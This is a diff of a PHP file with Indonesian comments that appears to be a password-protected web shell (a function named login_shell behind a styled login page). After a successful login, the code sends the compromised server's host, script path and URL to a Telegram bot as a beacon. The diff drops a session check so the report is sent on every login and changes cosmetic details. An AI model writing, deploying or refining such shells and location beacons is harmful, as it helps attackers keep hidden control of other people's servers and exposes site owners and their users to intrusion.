@@ -29,30 +29,21 @@ function sendTelegramMessage($message) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input_password = $_POST['password'];
 
-    // Pastikan Anda mendefinisikan $correct_password di suatu tempat
     if ($input_password === $correct_password) {
-        // Cek apakah pesan sudah dikirim dalam sesi ini
-        if (!isset($_SESSION['message_sent'])) {
-            // Ambil informasi keberadaan bot
-            $server_info = "Host: " . $_SERVER['HTTP_HOST'] . "\n";
-            $script_name = "Nama Skrip: " . $_SERVER['SCRIPT_NAME'] . "\n";
-            $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
+        // Ambil informasi keberadaan bot
+        $server_info = "Host: " . $_SERVER['HTTP_HOST'] . "\n";
+        $script_name = "Nama Skrip: " . $_SERVER['SCRIPT_NAME'] . "\n";
+        $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
 
-            // Buat pesan
-            $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
+        // Buat pesan
+        $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
 
-            // Kirim pesan
-            sendTelegramMessage($message);
+        // Kirim pesan
+        sendTelegramMessage($message);
 
-            // Tandai bahwa pesan sudah dikirim
-            $_SESSION['message_sent'] = true;
-
-            echo "good";
-        } else {
-            echo " ";
-        }
+        echo " ";
     } else {
-        echo "Ulang cok!!";
+        echo "ulang cok!";
     }
 }
 function login_shell() {
@@ -70,7 +61,7 @@ function login_shell() {
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
     <style>
         body {
-            background-image: url('https://c4.wallpaperflare.com/wallpaper/780/341/142/anime-sharingan-red-eyes-naruto-shippuuden-wallpaper-preview.jpg');
+            background-image: url('https://wallpapercave.com/wp/wp12008745.jpg');
             background-size: cover; /* Menutupi seluruh halaman */
             background-position: center; /* Memposisikan gambar di tengah */
             height: 100vh; /* Memastikan tinggi halaman 100% dari viewport */
